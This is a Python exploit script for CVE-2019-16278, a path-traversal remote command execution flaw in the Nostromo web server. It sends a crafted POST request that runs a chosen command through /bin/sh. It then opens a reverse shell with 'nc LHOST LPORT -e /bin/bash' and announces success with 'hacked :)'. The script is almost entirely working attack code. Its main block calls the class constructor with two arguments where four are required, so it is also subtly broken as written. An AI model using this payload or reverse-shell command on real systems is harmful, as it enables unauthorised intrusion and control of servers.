import argparse
import socket
import sys
from log_colors import *

# CVE-2019-16278
class CVE2019_16278:

    def __init__(self, rhost, rport, lhost, lport):
        print (LogColors.BLUE + "target: " + rhost + ":" + rport + "..." + LogColors.ENDC)
        self.rhost, self.rport = rhost, rport
        self.lhost, self.lport = lhost, lport
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect()

    def connect(self):
        print (LogColors.BLUE + "connecting to " + self.rhost + ":" + self.rport + "..." + LogColors.ENDC)
        try:
            self.sock.connect((self.rhost, int(self.rport)))
            print (LogColors.YELLOW + self.sock.recv(100).decode() + LogColors.ENDC)
        except Exception:
            print (LogColors.RED + "failed to connect " + self.rhost + ":" + self.rport + LogColors.ENDC)
            sys.exit()

    # send payload
    def run(self, cmd):
        print (LogColors.BLUE + "sending payload..." + LogColors.ENDC)
        payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
        payload += "Content-Length: 1\r\n\r\necho\necho\n"
        payload += "%s 2>&1" % cmd
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        payload = payload.encode()
        self.sock.sendall(payload)
        print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        resp = ""
        while True:
            chunk = self.sock.recv(1024)
            if chunk:
                chunk = chunk.decode()
                resp += chunk
            else:
                break
        print (LogColors.YELLOW + resp + LogColors.ENDC)

    # revshell
    def get_reverse_shell(self):
        cmd = "nc {} {} -e /bin/bash".format(self.lhost, self.lport)
        self.run(cmd)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-rh','--host', required = True, help = "target host")
    parser.add_argument('-p','--port', required = True, help = "target port")
    parser.add_argument('-lh','--lhost', required = True, help = "revshell listener host")
    parser.add_argument('-lp','--lport', required = True, help = "revshell listener port")
    parser.add_argument('-c','--cmd', required = True, help = "command")
    args = vars(parser.parse_args())
    host, port = args['host'], args['port']
    cmd = args['cmd']
    cve = CVE2019_16278(host, port)
    cve.run(cmd)
    cve.get_reverse_shell()
    #while True:
    #    cmd = input('sh$ ').lower()
    #    if (cmd == 'exit'):
    #        sys.exit(0)
    #    cve.run(cmd)

